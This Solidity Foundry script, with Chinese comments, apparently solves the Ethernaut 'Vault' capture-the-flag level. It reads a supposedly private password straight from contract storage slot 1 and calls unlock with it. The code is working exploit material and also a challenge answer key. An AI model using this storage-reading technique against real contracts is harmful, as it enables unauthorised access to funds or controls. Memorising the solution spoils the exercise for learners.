// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IVault {
    function locked() external view returns (bool);
    function unlock(bytes32 _password) external;
}

contract VaultAttack is Script {
    function run() external {
        // Vault 关卡地址
        address vaultLevel = 0x666385d65acaA3B2554CDd58f9D0B35b636063A8;

        // 开始广播交易
        vm.startBroadcast();

        // 直接读取存储中的密码
        // 密码存储在位置 1（第一个状态变量是 locked，在位置 0）
        bytes32 password = vm.load(vaultLevel, bytes32(uint256(1)));
        console.log("Password found:", vm.toString(password));

        // 直接调用 vault 的 unlock 函数
        IVault(vaultLevel).unlock(password);

        // 停止广播
        vm.stopBroadcast();
    }
}